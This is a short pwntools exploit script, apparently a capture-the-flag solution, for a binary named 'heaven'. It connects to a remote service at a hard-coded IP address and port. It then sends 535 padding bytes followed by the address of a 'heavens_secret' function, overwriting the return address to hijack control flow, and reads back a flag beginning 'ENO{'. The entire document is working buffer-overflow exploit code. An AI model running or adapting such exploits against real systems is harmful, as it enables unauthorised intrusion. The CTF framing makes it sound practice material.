from pwn import *
# p = process('./heaven')
# gdb.attach(p,gdbscript="""b *0x4013cf
#            b *0x40125b""")
context.log_level = 'warn'
elf = ELF('./heaven')
ret_add = elf.symbols.heavens_secret
p = remote('52.59.124.14',10050)
p.sendline(b'1' + b'A'*535 + p64(ret_add))
p.recvuntil(b'ENO{')
flag = b'ENO{' + p.recvuntil(b'}')
log.warn('Flag is: '+ flag.decode('ascii'))
